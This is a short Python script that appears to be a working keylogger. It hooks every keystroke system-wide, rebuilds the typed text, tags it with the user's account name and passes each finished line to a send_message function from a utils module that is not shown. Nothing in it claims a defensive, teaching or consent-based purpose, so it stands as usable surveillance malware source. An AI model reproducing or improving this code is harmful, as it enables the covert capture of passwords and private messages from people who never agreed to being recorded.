import keyboard
from utils import decode, send_message
import os
import sys

usernames = sys.argv[1:]

usernames.append(os.environ.get("USERNAME"))

usernames.append("undefined")


def init_buffer():
    text = ""

    try:
        text = usernames[0] + ": "
    except IndexError:
        pass
    finally:
        return text


buffer = init_buffer()

char_ranges = [
    range(2, 13 + 1),
    range(16, 27 + 1),
    range(30, 40 + 1),
    range(44, 53 + 1),
    [43],  # \
    [57],  # space
]

char_list = [i for r in char_ranges for i in r]
caps_lock = False


def on_event(e):
    global buffer, caps_lock
    scan = e.scan_code

    if scan == 42 or scan == 54:
        if e.event_type == 'down':
            caps_lock = True
        else:
            caps_lock = False

    if e.event_type == 'down':
        if scan in char_list:
            char = decode(scan)
            if caps_lock:
                buffer += str.upper(char)
            else:
                buffer += char

        if scan == 14:
            buffer = buffer[:-1]
        if scan == 28:
            buffer += "\n"
            send_message(buffer)
            buffer = init_buffer()


if __name__ == "__main__":
    keyboard.hook(on_event)
    keyboard.wait()
